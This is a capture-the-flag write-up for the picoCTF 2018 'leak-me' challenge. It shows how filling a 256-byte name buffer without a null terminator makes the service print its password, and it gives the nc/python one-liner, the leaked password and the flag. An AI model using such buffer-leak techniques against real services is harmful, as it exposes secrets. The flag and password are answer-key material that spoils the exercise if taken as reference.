> leak-me - Points: 200 - (Solves: 481)
> Can you authenticate to this service and get the flag? Connect with nc 2018shell1.picoctf.com 57659. Source.

From the source we can see that the name buffer is of size 256.

If we fill in the buffer completely, we can see that the password is being printed out after it. This is because the buffer is full and there is therefore no space for the null terminator. Anything after it is therefore printed out when the name is printed.

```
% python -c "print 'A'*256" | nc 2018shell1.picoctf.com 57659
What is your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_56b977

Incorrect Password!
```

Now we can connect again and input the password `a_reAllY_s3cuRe_p4s$word_56b977` to get the flag.

```
% nc 2018shell1.picoctf.com 57659
What is your name?
a
Hello a,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_56b977
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_2b5cbbaa}
```

Flag: `picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_2b5cbbaa}`
